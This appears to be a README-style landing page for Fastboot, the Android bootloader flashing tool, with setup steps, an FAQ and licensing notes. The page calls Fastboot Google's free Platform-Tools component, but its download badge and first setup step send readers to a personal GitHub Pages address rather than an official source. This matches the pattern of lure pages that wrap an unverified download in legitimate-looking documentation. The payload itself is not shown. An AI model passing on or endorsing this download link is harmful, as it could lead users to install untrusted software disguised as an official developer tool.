# Fastboot

<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSgUmJlmeIe638rybfd-JB1TEUFDX1f_v6gz3wczBVkNA&s=10" alt="Fastboot logo" width="120"/>

[![Download Fastboot](https://img.shields.io/badge/⬇_Download_Fastboot-2962FF?style=for-the-badge)](https://stevenmorales29.github.io/.github/Fastboot-Desktop-App)

Fastboot is an Android developer tool for Windows that flashes images, unlocks or locks a device's bootloader, and reads back diagnostic information from the command line.

Most people first run into this because they've searched fastboot mode android after their phone booted to an unfamiliar screen instead of its usual home screen — that's exactly the state Fastboot for Windows is built to talk to, sending it images and instructions instead of just displaying a logo.

<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSLCPamxRZtvz1KzyvqIseETRTAkWFd8xrpfGnh3A9nihGDK--K-1ojKTM&s=10" alt="Fastboot Screenshot" width="100%"/>
*A Windows terminal running fastboot against a device connected over USB.*

## Why people use it
- `[Flash]` Write a boot, recovery, or system image straight to a device partition
- `[Diagnose]` Read back bootloader variables to see a device's current state
- `[Recover]` Get a device that won't boot normally back into a working state
- `[Unlock]` Lock or unlock the bootloader for development and testing work

## What it needs
- [ ] A currently supported 64-bit edition of Windows
- [ ] A free USB port and a data-capable USB cable
- [ ] The correct USB driver installed for your specific Android device

## Setting up
1. Download the Android SDK Platform-Tools package for Windows from the button above.
2. Extract the archive to a folder you can easily find, such as `C:\platform-tools`.
3. Install the USB driver your Android device's manufacturer provides, if Windows doesn't recognize it automatically.

## Getting going
1. Start by putting your Android device into fastboot mode, usually with a button combination held at power-on.
2. From there, open a Command Prompt inside your platform-tools folder and run `fastboot devices` — a listed device ID means the connection is working.
3. Once that's confirmed, you're ready to run whatever fastboot command your task calls for, from flashing an image to checking a variable.

## Questions people ask
| Question | Answer |
|---|---|
| What is fastboot mode? | It's a low-level diagnostic and flashing mode built into most Android devices' bootloaders, separate from the regular operating system. |
| Is Fastboot free? | Yes — it's distributed at no charge as part of Google's Android SDK Platform-Tools. |
| Can I brick my device with it? | Flashing the wrong image or partition can leave a device unbootable, so it pays to confirm commands and images before running them. |

## Licensing
There's no license fee here — Fastboot comes bundled into Google's Android SDK Platform-Tools at no cost, and its underlying source lives in the open-source Android Open Source Project.

## If something goes wrong
Fastboot's built-in help command is the quickest way to check the exact syntax for any command you're unsure about. For broader questions — driver issues, device-specific quirks, or full command references — Android's official developer documentation covers the topic in more depth than any single README can.
